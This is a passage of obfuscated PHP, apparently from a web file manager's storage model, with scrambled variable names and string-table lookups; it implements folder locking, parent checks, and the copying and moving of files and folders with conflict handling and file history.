LNG($³íĞ¨è[557]); CacheLock::setErrorMsg($³íĞ¨è[159] . htmlspecialchars($ÔÎËš»[$³íĞ¨è[32]]) . $³íĞ¨è[536] . $Ë“”„öÑ); $this->_lockKey($ä–îÄç, 1); $this->_lockKey($ä–îÄç, 0); $©ºÀÂ—ú = array_reverse($this->parentLevelArray($ÔÎËš»[$³íĞ¨è[521]])); foreach ($©ºÀÂ—ú as $µÁÈ“ğ) { $ä–îÄç = $¨×ú‡‘‹ . $³íĞ¨è[558] . $µÁÈ“ğ; if (CacheLock::lockGet($³íĞ¨è[559] . $ä–îÄç)) { $ÔÎËš» = $this->sourceInfo($µÁÈ“ğ); CacheLock::setErrorMsg($³íĞ¨è[159] . htmlspecialchars($ÔÎËš»[$³íĞ¨è[32]]) . $³íĞ¨è[536] . $Ë“”„öÑ); $this->_lockKey($ä–îÄç, 1); $this->_lockKey($ä–îÄç, 0); } } } private function _lockCheckEnd($¶¶Ù´ã˜, $Ì¬÷¾ñ¦) { $±¨ÊøÈ =& $_SERVER[Ãìšã«™]; $ÌÖ…ºâ¸ = $¶¶Ù´ã˜ . $±¨ÊøÈ[10] . $Ì¬÷¾ñ¦; CacheLock::setErrorMsg($±¨ÊøÈ[373]); if (!isset($this->_lockTimeStart[$ÌÖ…ºâ¸])) { return; } $éïù»£ı = timeFloat() - $this->_lockTimeStart[$ÌÖ…ºâ¸]; unset($this->_lockTimeStart[$ÌÖ…ºâ¸]); if ($éïù»£ı > 0.5) { unset(self::$cacheSourceInfo[$±¨ÊøÈ[458] . $Ì¬÷¾ñ¦]); } $Ó¾¦Èíû = $this->sourceInfo($Ì¬÷¾ñ¦); if (!$Ó¾¦Èíû) { show_json(LNG($±¨ÊøÈ[106]), !1); } } private function _lockParent($¿ÆÊ…ø, $ö„õğñ, $„âÉ¶) { if (!$this->autoLockSet) { return; } $õÚ¦Àê = $this->sourceInfo($¿ÆÊ…ø); if (!is_array($õÚ¦Àê)) { return; } $î©ßœÁŞ = array_reverse($this->parentLevelArray($õÚ¦Àê[$_SERVER[Ãìšã«™][521]])); foreach ($î©ßœÁŞ as $ş¢âŠÕ¤) { $this->_lockEvent($ş¢âŠÕ¤, $ö„õğñ, $„âÉ¶); } } private function _lockEvent($Êğ „, $¢¤œÌç¼, $æòÒà‚¹) { $ƒÁ£‹²¡ =& $_SERVER[Ãìšã«™]; if (!$this->autoLockSet) { return; } foreach ($¢¤œÌç¼ as $Ğ±¢•¢²) { $«ÛïùÓò = $Ğ±¢•¢² . $ƒÁ£‹²¡[10] . $Êğ „; if ($æòÒà‚¹ && CacheLock::lockGet($ƒÁ£‹²¡[559] . $«ÛïùÓò)) { continue; } $this->_lockKey($«ÛïùÓò, $æòÒà‚¹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($—ŸêóØì, $³Ş°€¦¸ = 1) { $„ü€®şÇ = $_SERVER[Ãìšã«™][559] . md5($—ŸêóØì); if ($³Ş°€¦¸) { if (isset(self::$_lockItemArr[$„ü€®şÇ])) { return; } self::$_lockItemArr[$„ü€®şÇ] = 1; CacheLock::lock($„ü€®şÇ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$„ü€®şÇ])) { return; } unset(self::$_lockItemArr[$„ü€®şÇ]); CacheLock::unlock($„ü€®şÇ); } } public function isParentOf($Ñ‡Ì”Ÿ, $ÒÃÀ¹â) { $ß÷ûÏåÜ =& $_SERVER[Ãìšã«™]; $ôÊÆÇàª = $this->sourceInfo($Ñ‡Ì”Ÿ); $Ï…“Ş§‚ = $this->sourceInfo($ÒÃÀ¹â); $ËúŒ¥ãº = $ôÊÆÇàª[$ß÷ûÏåÜ[521]] . $ôÊÆÇàª[$ß÷ûÏåÜ[403]] . $ß÷ûÏåÜ[50]; $Ì¹©œ…İ = $Ï…“Ş§‚[$ß÷ûÏåÜ[521]] . $Ï…“Ş§‚[$ß÷ûÏåÜ[403]] . $ß÷ûÏåÜ[50]; $ÓğÂòÇù = strpos($Ì¹©œ…İ, $ËúŒ¥ãº) === 0; return $ÓğÂòÇù; } private $targetIsDelete = 0; public function copy($Å½³…ùæ, $Œ‚âÄÑ, $ßä“¬áŸ = REPEAT_REPLACE, $¸í™›© = '') { $ÛèôÄ˜ =& $_SERVER[Ãìšã«™]; $Ì„÷âÃø = $this->sourceInfo($Å½³…ùæ); $­¢Ãø®¥ = $this->sourceInfo($Œ‚âÄÑ); if (!$Ì„÷âÃø || !$­¢Ãø®¥ || $­¢Ãø®¥[$ÛèôÄ˜[411]] != $ÛèôÄ˜[89]) { return !1; } if ($this->isParentOf($Å½³…ùæ, $Œ‚âÄÑ)) { return !1; } $»óÍß¤ = $¸í™›© ? $¸í™›© : $Ì„÷âÃø[$ÛèôÄ˜[32]]; $this->lockCopyStart($Å½³…ùæ); $this->lockWriteStart($Œ‚âÄÑ, $»óÍß¤); $ß‰«åÍ¢ = array($ÛèôÄ˜[560] => array(), $ÛèôÄ˜[561] => array(), $ÛèôÄ˜[562] => array()); $this->targetIsDelete = intval($Ì„÷âÃø[$ÛèôÄ˜[431]]); $½Âà¯› = $this->fileNameExistCache($Œ‚âÄÑ, $Ì„÷âÃø[$ÛèôÄ˜[32]]); $ïÆÙâ®ğ = $this->_copy($Å½³…ùæ, $Œ‚âÄÑ, $ßä“¬áŸ, $ß‰«åÍ¢, !0, $¸í™›©); $this->_childrenListClear(); $this->lockCopyEnd($Å½³…ùæ); $this->lockWriteEnd($Œ‚âÄÑ, $»óÍß¤); if ($Ì„÷âÃø[$ÛèôÄ˜[411]] == $ÛèôÄ˜[89] && $½Âà¯› == $ïÆÙâ®ğ) { $this->folderSizeResetChildren($½Âà¯›); } Model($ÛèôÄ˜[563])->addAll($ß‰«åÍ¢[$ÛèôÄ˜[561]], array(), !0); if ($½Âà¯› != $ïÆÙâ®ğ || $Ì„÷âÃø[$ÛèôÄ˜[411]] == $ÛèôÄ˜[89]) { Model($ÛèôÄ˜[564])->eventCopy($ïÆÙâ®ğ); } $this->saveAll($ß‰«åÍ¢[$ÛèôÄ˜[562]]); Model($ÛèôÄ˜[192])->linkAdd($ß‰«åÍ¢[$ÛèôÄ˜[560]]); $this->folderSizeReset($Œ‚âÄÑ); $this->updateModifyTime($Œ‚âÄÑ); return $ïÆÙâ®ğ; } private function _copy($§˜†õÍ, $¡º¯ÏòÜ, $µùÔ¾®™, &$Ü¢‡Æ¤ö, $äŞ‡Ô·©, $—Ö¿åÅ¦ = '') { $¶¿Ø“Ó =& $_SERVER[Ãìšã«™]; $üÉĞÂıó = $this->sourceInfoCache($§˜†õÍ); $ú ”Ç¡¢ = $üÉĞÂıó[$¶¿Ø“Ó[411]] == $¶¿Ø“Ó[89]; $©ê—ñ‹ˆ = $—Ö¿åÅ¦ ? $—Ö¿åÅ¦ : $üÉĞÂıó[$¶¿Ø“Ó[32]]; $¾‚‰†şæ = $this->fileNameExistCache($¡º¯ÏòÜ, $©ê—ñ‹ˆ); if ($äŞ‡Ô·©) { $this->_childrenAllMake($§˜†õÍ); if ($ú ”Ç¡¢ && $¾‚‰†şæ) { $this->_childrenAllMake($¾‚‰†şæ); } } if (!$¾‚‰†şæ) { return $this->_copyCreate($§˜†õÍ, $¡º¯ÏòÜ, $©ê—ñ‹ˆ, $Ü¢‡Æ¤ö); } $è©çÀË¬ = $¾‚‰†şæ; if ($ú ”Ç¡¢) { if ($µùÔ¾®™ == REPEAT_RENAME_FOLDER) { $©ê—ñ‹ˆ = $this->fileNameAutoCache($¡º¯ÏòÜ, $©ê—ñ‹ˆ, $µùÔ¾®™, $ú ”Ç¡¢); $è©çÀË¬ = $this->_copyCreate($§˜†õÍ, $¡º¯ÏòÜ, $©ê—ñ‹ˆ, $Ü¢‡Æ¤ö); } else { $¬ì×Ü¦× = $this->_childrenList($§˜†õÍ); foreach ($¬ì×Ü¦× as $ˆıÌùÓü) { $this->_copy($ˆıÌùÓü[$¶¿Ø“Ó[403]], $¾‚‰†şæ, $µùÔ¾®™, $Ü¢‡Æ¤ö, !1); } } } else { if ($µùÔ¾®™ == REPEAT_RENAME || $µùÔ¾®™ == REPEAT_RENAME_FOLDER) { $©ê—ñ‹ˆ = $this->fileNameAutoCache($¡º¯ÏòÜ, $©ê—ñ‹ˆ, $µùÔ¾®™, $ú ”Ç¡¢); $è©çÀË¬ = $this->_copyCreate($§˜†õÍ, $¡º¯ÏòÜ, $©ê—ñ‹ˆ, $Ü¢‡Æ¤ö); } else { if ($µùÔ¾®™ == REPEAT_REPLACE) { $²±ÉÉ’ì = $this->sourceInfoCache($¾‚‰†şæ); $´ÙŒ³¡› = $this->fileHistory($²±ÉÉ’ì, $üÉĞÂıó[$¶¿Ø“Ó[467]], $üÉĞÂıó[$¶¿Ø“Ó[80]]); if ($´ÙŒ³¡›) { $Ü¢‡Æ¤ö[$¶¿Ø“Ó[560]][] = $üÉĞÂıó[$¶¿Ø“Ó[467]]; } } else { if ($µùÔ¾®™ == REPEAT_SKIP) { } } } Hook::trigger($¶¿Ø“Ó[565], array($¶¿Ø“Ó[566], $üÉĞÂıó, 0)); } return $è©çÀË¬; } private function _copyCreate($ÀñŸ»ì¦, $ğâë†ÀÆ, $ø†—â“Ë, &$¨ößúú¯) { $äÚÀ«ë‘ =& $_SERVER[Ãìšã«™]; $ğ¯ºå· = $this->sourceInfoCache($ÀñŸ»ì¦); $íü—Üá = $this->sourceInfoCache($ğâë†ÀÆ); $³æ†Äû£ = $this->_makeItemData($ğ¯ºå·, $íü—Üá, $ø†—â“Ë); Hook::trigger($äÚÀ«ë‘[567], $³æ†Äû£); Hook::trigger($äÚÀ«ë‘[568], array($äÚÀ«ë‘[569], $³æ†Äû£, 0)); $“‘Êç“ = $this->add($³æ†Äû£); $«ÓÙšÃ¼ = array($äÚÀ«ë‘[403] => $“‘Êç“, $äÚÀ«ë‘[32] => $ø†—â“Ë); $this->_copyApplyMeta($«ÓÙšÃ¼, $¨ößúú¯); if ($ğ¯ºå·[$äÚÀ«ë‘[411]] != $äÚÀ«ë‘[89]) { $¨ößúú¯[$äÚÀ«ë‘[560]][] = $ğ¯ºå·[$äÚÀ«ë‘[467]]; return $“‘Êç“; } $™æœÙ‘ = array(); $äªÜö€ = array(); $this->_childrenListAll($ÀñŸ»ì¦, $™æœÙ‘); $‡Ó¾ööÊ = count($™æœÙ‘); if ($‡Ó¾ööÊ == 0) { return $“‘Êç“; } $°Èò÷ÊÕ = $this->sourceInfo($“‘Êç“); foreach ($™æœÙ‘ as $›ŞïĞæÜ) { $õ«İü¥Ş = $this->_makeItemData($›ŞïĞæÜ, $°Èò÷ÊÕ, $›ŞïĞæÜ[$äÚÀ«ë‘[32]]); $õ«İü¥Ş[$äÚÀ«ë‘[521]] = $›ŞïĞæÜ[$äÚÀ«ë‘[521]]; $äªÜö€[] = $õ«İü¥Ş; } $this->chunkEventSet($äÚÀ«ë‘[570], array($äÚÀ«ë‘[571], $³æ†Äû£, $‡Ó¾ööÊ)); $this->addAll($äªÜö€, array(), !1); $î†ì¿ÓÇ = $this->where(array($äÚÀ«ë‘[498] => $“‘Êç“))->select(); $÷ÏùÕ´” = $this->_childrenMakeRelation($™æœÙ‘, $î†ì¿ÓÇ); $÷ÏùÕ´”[$ÀñŸ»ì¦] = $“‘Êç“; $·È‘ï·› = array(); $çÄüÓôÛ = array(); foreach ($î†ì¿ÓÇ as $›ŞïĞæÜ) { $öÖÛã¿¸ = $›ŞïĞæÜ[$äÚÀ«ë‘[403]]; $×Ä¸™Ä = $this->_childrenMatch($÷ÏùÕ´”, $›ŞïĞæÜ, $°Èò÷ÊÕ); $·È‘ï·›[] = array($äÚÀ«ë‘[403], $öÖÛã¿¸, $äÚÀ«ë‘[498], $×Ä¸™Ä[$äÚÀ«ë‘[498]]); $çÄüÓôÛ[] = array($äÚÀ«ë‘[403], $öÖÛã¿¸, $äÚÀ«ë‘[521], $×Ä¸™Ä[$äÚÀ«ë‘[521]]); $this->_copyApplyMeta($›ŞïĞæÜ, $¨ößúú¯); if ($›ŞïĞæÜ[$äÚÀ«ë‘[411]] != $äÚÀ«ë‘[89]) { $¨ößúú¯[$äÚÀ«ë‘[560]][] = $›ŞïĞæÜ[$äÚÀ«ë‘[467]]; } } $this->chunkEventSet($äÚÀ«ë‘[572], array($äÚÀ«ë‘[573], $³æ†Äû£, $‡Ó¾ööÊ)); $this->saveAll($·È‘ï·›); $this->chunkEventSet($äÚÀ«ë‘[574], array($äÚÀ«ë‘[575], $³æ†Äû£, $‡Ó¾ööÊ)); $this->saveAll($çÄüÓôÛ); return $“‘Êç“; } private function _childrenMakeRelation($îèê¦ò, $åíÕßÎñ) { $ôµÍõÊ¹ =& $_SERVER[Ãìšã«™]; $ÚÜÇı‘æ = array(); $†éŞ«´ = array(); foreach ($îèê¦ò as $­Ø—†ñï) { $İùü—±Ï = $­Ø—†ñï[$ôµÍõÊ¹[32]] . $ôµÍõÊ¹[8] . $­Ø—†ñï[$ôµÍõÊ¹[521]]; $ÚÜÇı‘æ[$İùü—±Ï] = $­Ø—†ñï[$ôµÍõÊ¹[403]]; } foreach ($åíÕßÎñ as $­Ø—†ñï) { $İùü—±Ï = $­Ø—†ñï[$ôµÍõÊ¹[32]] . $ôµÍõÊ¹[8] . $­Ø—†ñï[$ôµÍõÊ¹[521]]; $Ù¤«–‚ı = $ÚÜÇı‘æ[$İùü—±Ï]; $†éŞ«´[$Ù¤«–‚ı] = $­Ø—†ñï[$ôµÍõÊ¹[403]]; } return $†éŞ«´; } private function _childrenMatch($ÂúÙô¬§, $àçú”œØ, $¬¸íµ×”) { $¼ß«ş¹ =& $_SERVER[Ãìšã«™]; $ ‹ŠËâ‹ = $¬¸íµ×”[$¼ß«ş¹[521]]; $§îü‘‚ = $this->parentLevelArray($àçú”œØ[$¼ß«ş¹[521]]); foreach ($§îü‘‚ as $ö°¢¥—Ó) { if (isset($ÂúÙô¬§[$ö°¢¥—Ó])) { $ ‹ŠËâ‹ .= $ÂúÙô¬§[$ö°¢¥—Ó] . $¼ß«ş¹[576]; } } $ ‹ŠËâ‹ = rtrim($ ‹ŠËâ‹, $¼ß«ş¹[50]) . $¼ß«ş¹[50]; $ûŠã®¼ = $this->parentLevelArray($ ‹ŠËâ‹); $’¿Ä‚Ì = $ûŠã®¼[count($ûŠã®¼) - 1]; return array($¼ß«ş¹[498] => $’¿Ä‚Ì, $¼ß«ş¹[521] => $ ‹ŠËâ‹); } private function _makeItemData($§§äÈ–Œ, $ôåà€ñ¿, $ãÖÓ ğ) { $úşµ«ÄÆ =& $_SERVER[Ãìšã«™]; $¦ƒáç•Ù = array($úşµ«ÄÆ[577] => $§§äÈ–Œ[$úşµ«ÄÆ[411]], $úşµ«ÄÆ[421] => $ãÖÓ ğ, $úşµ«ÄÆ[578] => $§§äÈ–Œ[$úşµ«ÄÆ[413]] ? $§§äÈ–Œ[$úşµ«ÄÆ[413]] : $úşµ«ÄÆ[12], $úşµ«ÄÆ[468] => $§§äÈ–Œ[$úşµ«ÄÆ[467]] ? $§§äÈ–Œ[$úşµ«ÄÆ[467]] : 0, $úşµ«ÄÆ[579] => $§§äÈ–Œ[$úşµ«ÄÆ[80]] ? $§§äÈ–Œ[$úşµ«ÄÆ[80]] : 0, $úşµ«ÄÆ[580] => intval($ôåà€ñ¿[$úşµ«ÄÆ[412]]), $úşµ«ÄÆ[581] => intval($ôåà€ñ¿[$úşµ«ÄÆ[504]]), $úşµ«ÄÆ[582] => intval(USER_ID), $úşµ«ÄÆ[583] => intval(USER_ID), $úşµ«ÄÆ[402] => intval($ôåà€ñ¿[$úşµ«ÄÆ[403]]), $úşµ«ÄÆ[584] => $ôåà€ñ¿[$úşµ«ÄÆ[521]] . $ôåà€ñ¿[$úşµ«ÄÆ[403]] . $úşµ«ÄÆ[50], $úşµ«ÄÆ[425] => $§§äÈ–Œ[$úşµ«ÄÆ[86]] ? $§§äÈ–Œ[$úşµ«ÄÆ[86]] : time(), $úşµ«ÄÆ[430] => 0, $úşµ«ÄÆ[585] => $úşµ«ÄÆ[12]); return $¦ƒáç•Ù; } private function _copyApplyMeta($ù¢“ÓÃŒ, &$Óˆê¸’î) { $ªâ¦•ô =& $_SERVER[Ãìšã«™]; $ÊŞøÑŸ = $ù¢“ÓÃŒ[$ªâ¦•ô[403]]; $³ä¤™İ = $ù¢“ÓÃŒ[$ªâ¦•ô[32]]; if (!isset($ù¢“ÓÃŒ[$ªâ¦•ô[586]]) || !$ù¢“ÓÃŒ[$ªâ¦•ô[586]] || $ù¢“ÓÃŒ[$ªâ¦•ô[586]] == $ªâ¦•ô[190]) { $Óˆê¸’î[$ªâ¦•ô[562]][] = array($ªâ¦•ô[403], $ÊŞøÑŸ, $ªâ¦•ô[586], short_id($ÊŞøÑŸ)); } if (Input::check($³ä¤™İ, $ªâ¦•ô[587])) { $Óˆê¸’î[$ªâ¦•ô[561]][] = array($ªâ¦•ô[403] => $ÊŞøÑŸ, $ªâ¦•ô[95] => $ªâ¦•ô[464], $ªâ¦•ô[369] => str_replace($ªâ¦•ô[53], $ªâ¦•ô[12], Pinyin::get($³ä¤™İ))); $Óˆê¸’î[$ªâ¦•ô[561]][] = array($ªâ¦•ô[403] => $ÊŞøÑŸ, $ªâ¦•ô[95] => $ªâ¦•ô[463], $ªâ¦•ô[369] => Pinyin::get($³ä¤™İ, $ªâ¦•ô[588])); } $Óˆê¸’î[$ªâ¦•ô[561]][] = array($ªâ¦•ô[403] => $ÊŞøÑŸ, $ªâ¦•ô[95] => $ªâ¦•ô[442], $ªâ¦•ô[369] => KodSort::makeStr($³ä¤™İ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($±¤¦Ÿ¯ú) { $´·–Ëå™ =& $_SERVER[Ãìšã«™]; $£‹Ñ®ªè = $this->sourceInfo($±¤¦Ÿ¯ú); $¬®Ï†Äê = $´·–Ëå™[589]; $»ÓÅ„µ± = array($´·–Ëå™[521] => array($´·–Ëå™[544], $£‹Ñ®ªè[$´·–Ëå™[521]] . $±¤¦Ÿ¯ú . $´·–Ëå™[545]), $´·–Ëå™[431] => $this->targetIsDelete); $É©ŸÙÓË = $this->field($¬®Ï†Äê)->where($»ÓÅ„µ±)->select(); if (!$É©ŸÙÓË) { return; } $É©ŸÙÓË = array_to_keyvalue($É©ŸÙÓË, $´·–Ëå™[403]); foreach ($É©ŸÙÓË as $¼×­Ûä—) { $½úúÚ§ = $¼×­Ûä—[$´·–Ëå™[498]]; $±¤¦Ÿ¯ú = $¼×­Ûä—[$´·–Ëå™[403]]; if (!isset($this->_childrenListCache[$±¤¦Ÿ¯ú]) && $¼×­Ûä—[$´·–Ëå™[411]] == $´·–Ëå™[89]) { $this->_childrenListCache[$±¤¦Ÿ¯ú] = array(); } if (!isset($this->_childrenListCache[$½úúÚ§])) { $this->_childrenListCache[$½úúÚ§] = array(); } $this->_childrenListCache[$½úúÚ§][$±¤¦Ÿ¯ú] = $¼×­Ûä—; $this->_childrenItemCache[$±¤¦Ÿ¯ú] = $¼×­Ûä—; } } private function _childrenListAll($ğ¹Ê¯Âî, &$ğ’Œç‡) { $íİ„Â¯™ =& $_SERVER[Ãìšã«™]; if (!isset($this->_childrenListCache[$ğ¹Ê¯Âî])) { return; } $ØŒ±ß«¤ = $this->_childrenListCache[$ğ¹Ê¯Âî]; foreach ($ØŒ±ß«¤ as $··ŠöÆî => $»·Ğ’) { $ğ’Œç‡[$··ŠöÆî] = $»·Ğ’; if ($»·Ğ’[$íİ„Â¯™[411]] == $íİ„Â¯™[89]) { $this->_childrenListAll($··ŠöÆî, $ğ’Œç‡); } } } private function sourceInfoCache($ñı¦Œ‡Ú) { if (isset($this->_childrenItemCache[$ñı¦Œ‡Ú])) { return $this->_childrenItemCache[$ñı¦Œ‡Ú]; } return $this->sourceInfo($ñı¦Œ‡Ú); } private function _childrenList($•¨õëÕü) { if (isset($this->_childrenListCache[$•¨õëÕü])) { return $this->_childrenListCache[$•¨õëÕü]; } return $this->_childrenListSelect($•¨õëÕü); } private function _childrenListSelect($Ã®ÀáØÁ) { $’¨¥…÷” =& $_SERVER[Ãìšã«™]; $½ºˆÅÈæ = array($’¨¥…÷”[498] => $Ã®ÀáØÁ, $’¨¥…÷”[431] => $this->targetIsDelete); $­Š¦Ë®© = $this->where($½ºˆÅÈæ)->select(); $­Š¦Ë®© = $­Š¦Ë®© ? $­Š¦Ë®© : array(); $Õì¼„Æğ = array_to_keyvalue($­Š¦Ë®©, $’¨¥…÷”[403]); $this->_childrenListCache[$Ã®ÀáØÁ] = $Õì¼„Æğ; foreach ($Õì¼„Æğ as $Ã®ÀáØÁ => $Àò’§) { $this->_childrenItemCache[$Ã®ÀáØÁ] = $Àò’§; } return $Õì¼„Æğ; } private function fileNameExistCache($™¾ºšäÃ, $îĞ‘Û°ë) { $»ïŠò¬š =& $_SERVER[Ãìšã«™]; $îĞ‘Û°ë = strtolower($îĞ‘Û°ë); $úô˜²ú× = $this->_childrenList($™¾ºšäÃ); foreach ($úô˜²ú× as $Œ×³üãĞ) { if ($îĞ‘Û°ë == strtolower($Œ×³üãĞ[$»ïŠò¬š[32]])) { return $Œ×³üãĞ[$»ïŠò¬š[403]]; } } return !1; } private function fileNameAutoCache($ºŞÙ”²Š, $ÌË„‘¸±, $Ã‘ˆÆ¤­, $»¾Šç·ì) { $£•Äô– =& $_SERVER[Ãìšã«™]; $“¼é¸éª = $this->_childrenList($ºŞÙ”²Š); $½äºÍşó = array_to_keyvalue($“¼é¸éª, $£•Äô–[12], $£•Äô–[32]); return $this->fileNameAutoGet($½äºÍşó, $ÌË„‘¸±, $Ã‘ˆÆ¤­, $»¾Šç·ì); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ÿ•¿£èÎ, $Ò˜Ğ óÚ, $õ¨øÔÚù = REPEAT_REPLACE, $â’ÆÚÁ = '') { $ïéÖ­ =& $_SERVER[Ãìšã«™]; $Øã»Ç²· = $this->sourceInfo($Ÿ•¿£èÎ); $éÖìŠëÔ = $this->sourceInfo($Ò˜Ğ óÚ); if ($Øã»Ç²·[$ïéÖ­[498]] == $éÖìŠëÔ[$ïéÖ­[403]]) { if ($Øã»Ç²·[$ïéÖ­[431]] == $ïéÖ­[89]) { Model($ïéÖ­[429])->restore(array($Ÿ•¿£èÎ)); } if (!$â’ÆÚÁ || $â’ÆÚÁ == $Øã»Ç²·[$ïéÖ­[32]]) { return $Ÿ•¿£èÎ; } } $µÁºã±« = $this->pathInfoMore($Ÿ•¿£èÎ); if ($this->isParentOf($Ÿ•¿£èÎ, $Ò˜Ğ óÚ)) { return !1; } if (!$Øã»Ç²· || !$éÖìŠëÔ || $éÖìŠëÔ[$ïéÖ­[411]] != $ïéÖ­[89]) { return !1; } Hook::trigger($ïéÖ­[590], $µÁºã±«); $this->targetIsDelete = intval($Øã»Ç²·[$ïéÖ­[431]]); if ($Øã»Ç²·[$ïéÖ­[498]] == $Ò˜Ğ óÚ && $â’ÆÚÁ != $Øã»Ç²·[$ïéÖ­[32]]) { $à‡åŒúû = $this->fileNameExist($Ò˜Ğ óÚ, $â’ÆÚÁ); if ($à‡åŒúû && $Øã»Ç²·[$ïéÖ­[411]] == $ïéÖ­[190]) { $˜Š÷á›â = $this->sourceInfo($à‡åŒúû); $Õ××ÕŠÃ = $this->fileHistory($˜Š÷á›â, $Øã»Ç²·[$ïéÖ­[467]], $Øã»Ç²·[$ïéÖ­[80]]); if (!$Õ××ÕŠÃ) { Model($ïéÖ­[470])->remove($Øã»Ç²·[$ïéÖ­[467]]); } $this->removeNow($Ÿ•¿£èÎ, !1); $this->folderSizeReset($Ò˜Ğ óÚ); Hook::trigger($ïéÖ­[591], $µÁºã±«); return $à‡åŒúû; } } $İâ·áÖ = $â’ÆÚÁ ? $â’ÆÚÁ : $Øã»Ç²·[$ïéÖ­[32]]; $this->lockMoveStart($Ÿ•¿£èÎ); $this->lockWriteStart($Ò˜Ğ óÚ, $İâ·áÖ); $¼Ì¨ÛŞƒ = array($ïéÖ­[560] => array(), $ïéÖ­[592] => !1); $this->clearShare($Ÿ•¿£èÎ, $Ò˜Ğ óÚ); $•ÊÖš«† = $this->fileNameExistCache($Ò˜Ğ óÚ, $Øã»Ç²·[$ïéÖ­[32]]); $›ê”¸µ = $this->_move($Ÿ•¿£èÎ, $Ò˜Ğ óÚ, $õ¨øÔÚù, $¼Ì¨ÛŞƒ, $â’ÆÚÁ); $this->sourceCacheClear(); if ($Øã»Ç²·[$ïéÖ­[411]] == $ïéÖ­[89] && $•ÊÖš«†) { $this->folderSizeResetChildren($›ê”¸µ); } Model($ïéÖ­[192])->linkAdd($¼Ì¨ÛŞƒ[$ïéÖ­[560]]); if ($•ÊÖš«† && $¼Ì¨ÛŞƒ[$ïéÖ­[592]]) { $this->removeNow($Ÿ•¿£èÎ, !1); } $this->lockMoveEnd($Ÿ•¿£èÎ); $this->lockWriteEnd($Ò˜Ğ óÚ, $İâ·áÖ); $this->folderSizeReset($Øã»Ç²·[$ïéÖ­[498]]); $this->folderSizeReset($Ò˜Ğ óÚ); $®Ìğı†Õ = array($Øã»Ç²·[$ïéÖ­[498]], $Ò˜Ğ óÚ); if ($Øã»Ç²·[$ïéÖ­[411]] == $ïéÖ­[89]) { $®Ìğı†Õ[] = $Ÿ•¿£èÎ; } $this->updateModifyTime($®Ìğı†Õ); Model($ïéÖ­[564])->eventMove($Ÿ•¿£èÎ, $Øã»Ç²·[$ïéÖ­[498]], $Ò˜Ğ óÚ); Hook::trigger($ïéÖ­[591], $µÁºã±«); return $›ê”¸µ; } private function _move($Ê×º¶ü¶, $´²¸ê», $¯Û³ì½ª, &$òªÏî€ô, $¶¦Á”ë‘ = '') { $¾¨Â‹¼ =& $_SERVER[Ãìšã«™]; $·±ÖÒô = $this->sourceInfo($Ê×º¶ü¶); $ÈÍÑÏº¦ = $·±ÖÒô[$¾¨Â‹¼[411]] == $¾¨Â‹¼[89]; $Ü—Ë€ª¸ = $¶¦Á”ë‘ ? $¶¦Á”ë‘ : $·±ÖÒô[$¾¨Â‹¼[32]]; $ˆÂ¦úø = $this->fileNameExistCache($´²¸ê», $Ü—Ë€ª¸); $this->lockMoveStart($Ê×º¶ü¶); $this->lockWriteStart($´²¸ê», $Ü—Ë€ª¸); if (!$ˆÂ¦úø) { return $this->_moveForce($Ê×º¶ü¶, $´²¸ê», $Ü—Ë€ª¸); } $©ıêÉ×¬ = $ˆÂ¦úø; $ÃÜêúÃü = !1; if ($ÈÍÑÏº¦) { if ($¯Û³ì½ª == REPEAT_RENAME_FOLDER) { $Ü—Ë€ª¸ = $this->fileNameAuto($´²¸ê», $Ü—Ë€ª¸, $¯Û³ì½ª, $ÈÍÑÏº¦); $©ıêÉ×¬ = $this->_moveForce($Ê×º¶ü¶, $´²¸ê», $Ü—Ë€ª¸); } else { if ($¯Û³ì½ª == REPEAT_RENAME_FOLDER) { $¯Û³ì½ª = REPEAT_RENAME; } $Ò¬ÜÚ»õ = $this->_childrenListSelect($Ê×º¶ü¶); foreach ($Ò¬ÜÚ»õ as $¿€Ï£Ó•) { $this->_move($¿€Ï£Ó•[$¾¨Â‹¼[403]], $ˆÂ¦úø, $¯Û³ì½ª, $òªÏî€ô); } $ÃÜêúÃü = !0; } } else { if ($¯Û³ì½ª == REPEAT_SKIP) { $ÃÜêúÃü = !0; } else { if ($¯Û³ì½ª == REPEAT_RENAME || $¯Û³ì½ª == REPEAT_RENAME_FOLDER) { $Ü—Ë€ª¸ = $this->fileNameAuto($´²¸ê», $Ü—Ë€ª¸, $¯Û³ì½ª, $ÈÍÑÏº¦); $©ıêÉ×¬ = $this->_moveForce($Ê×º¶ü¶, $´²¸ê», $Ü—Ë€ª¸); } else { if ($¯Û³ì½ª == REPEAT_REPLACE) { $„ğŒÊæ´ = $this->sourceInfoCache($ˆÂ¦úø); $øÓªê¿ı = $this->fileHistory($„ğŒÊæ´, $·±ÖÒô[$¾¨Â‹¼[467]], $·±ÖÒô[$¾¨Â‹¼[80]]); $ÃÜêúÃü = !0; if ($øÓªê¿ı) { $òªÏî€ô[$¾¨Â‹¼[560]][] = $·±ÖÒô[$¾¨Â‹¼[467]]; } } } } } if ($ÃÜêúÃü && !$òªÏî€ô[$¾¨Â‹¼[592]]) { $òªÏî€ô[$¾¨Â‹¼[592]] = !0; } return $©ıêÉ×¬; } private function _moveForce($ñ¶ÄÉ€›, $³ƒ‘Ó›, $¹Æ¤‚–³) { $½ê˜Ñ²¦ =& $_SERVER[Ãìšã«™]; $¿ó‘Ö£¿ = $this->sourceInfo($ñ¶ÄÉ€›); $’ıª¢§­ = $this->sourceInfo($³ƒ‘Ó›); $íƒŒƒ¬ = $¿ó‘Ö£¿[$½ê˜Ñ²¦[411]] == $½ê˜Ñ²¦[89]; $¨†Ÿ‚ëÎ = array($½ê˜Ñ²¦[402] => $’ıª¢§­[$½ê˜Ñ²¦[403]], $½ê˜Ñ²¦[584] => $’ıª¢§­[$½ê˜Ñ²¦[521]] . $’ıª¢§­[$½ê˜Ñ²¦[403]] . $½ê˜Ñ²¦[50], $½ê˜Ñ²¦[580] => $’ıª¢§­[$½ê˜Ñ²¦[412]], $½ê˜Ñ²¦[581] => $’ıª¢§­[$½ê˜Ñ²¦[504]], $½ê˜Ñ²¦[583] => USER_ID, $½ê˜Ñ²¦[421] => $¹Æ¤‚–³); $œàôéÇ– = $¿ó‘Ö£¿[$½ê˜Ñ²¦[412]] == SourceModel::TYPE_GROUP && $’ıª¢§­[$½ê˜Ñ²¦[412]] == SourceModel::TYPE_GROUP && 